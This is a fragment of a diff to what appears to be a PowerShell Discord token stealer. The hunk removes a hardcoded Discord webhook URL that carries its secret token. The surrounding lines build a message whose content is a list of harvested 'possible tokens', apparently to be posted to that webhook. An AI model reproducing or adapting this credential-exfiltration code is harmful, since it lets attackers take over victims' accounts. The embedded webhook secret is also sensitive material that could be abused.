@@ -201,8 +201,6 @@ $tmpID=""
 $user=""
 $tmpTag=""
 
-$hookUrl = 'https://discord.com/api/webhooks/889662758910574662/aHaHRR3GFmiFr-wD8-RfDzrlfZIOv8P1u-SQL6qrdQmHh3is9s1ZHcL1qxRcd1kDRaYM'
-
 $Body = @{
   'username' = 'Tokens: '
   'content' = $possibleTokens | Format-Table -HideTableHeaders | Out-String
